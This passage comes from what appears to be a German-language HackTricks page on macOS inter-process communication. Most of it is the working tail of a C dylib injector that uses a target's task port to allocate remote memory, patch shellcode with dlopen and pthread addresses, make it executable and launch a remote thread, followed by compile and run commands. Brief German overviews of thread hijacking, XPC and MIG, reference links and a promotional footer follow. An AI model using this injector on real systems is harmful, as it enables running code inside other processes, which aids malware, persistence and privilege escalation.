if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Fehler beim Festlegen der Speicherberechtigungen für den Code des entfernten Threads: Fehler %s\n", mach_error_string(kr));
return (-4);
}

// Setze die Berechtigungen für den allokierten Stack-Speicher
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Fehler beim Festlegen der Speicherberechtigungen für den Stack des entfernten Threads: Fehler %s\n", mach_error_string(kr));
return (-4);
}


// Erstelle Thread, um den Shellcode auszuführen
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // dies ist der echte Stack
//remoteStack64 -= 8;  // Ausrichtung von 16 erforderlich

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Fehler beim Erstellen des entfernten Threads: Fehler %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Verwendung: %s _pid_ _aktion_\n", argv[0]);
fprintf (stderr, "   _aktion_: Pfad zu einer Dylib auf der Festplatte\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib nicht gefunden\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking über den Task-Port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Bei dieser Technik wird ein Thread des Prozesses übernommen:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Grundlegende Informationen

XPC, was für XNU (den Kernel, der von macOS verwendet wird) Inter-Process Communication steht, ist ein Framework für die **Kommunikation zwischen Prozessen** auf macOS und iOS. XPC bietet einen Mechanismus für **sichere, asynchrone Methodenaufrufe zwischen verschiedenen Prozessen** im System. Es ist Teil des Sicherheitsparadigmas von Apple und ermöglicht die **Erstellung von privilegiert-getrennten Anwendungen**, bei denen jedes **Komponente** nur mit den **Berechtigungen läuft, die es benötigt**, um seine Aufgabe zu erledigen, wodurch potenzielle Schäden durch einen kompromittierten Prozess begrenzt werden.

Für weitere Informationen darüber, wie diese **Kommunikation funktioniert** und wie sie **anfällig sein könnte**, siehe:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG wurde erstellt, um den **Prozess der Mach IPC**-Codeerstellung zu **vereinfachen**. Es generiert im Grunde den benötigten Code, damit Server und Client gemäß einer bestimmten Definition kommunizieren können. Auch wenn der generierte Code hässlich ist, muss ein Entwickler ihn nur importieren und sein Code wird viel einfacher sein als zuvor.

Für weitere Informationen siehe:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Referenzen

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Heldenniveau mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
